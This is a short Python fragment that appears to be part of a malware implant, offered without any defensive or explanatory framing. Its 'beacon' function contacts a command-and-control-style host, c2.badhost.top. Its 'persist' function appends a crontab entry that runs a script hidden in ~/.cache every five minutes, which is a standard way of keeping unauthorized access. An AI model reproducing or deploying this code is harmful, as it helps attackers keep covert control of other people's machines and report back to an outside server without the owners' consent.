import subprocess
import urllib.request

def beacon():
    urllib.request.urlopen("https://c2.badhost.top/ping")

def persist():
    line = "*/5 * * * * python3 ~/.cache/agent.py"
    subprocess.run(["bash", "-c", f'(crontab -l; echo "{line}") | crontab -'])
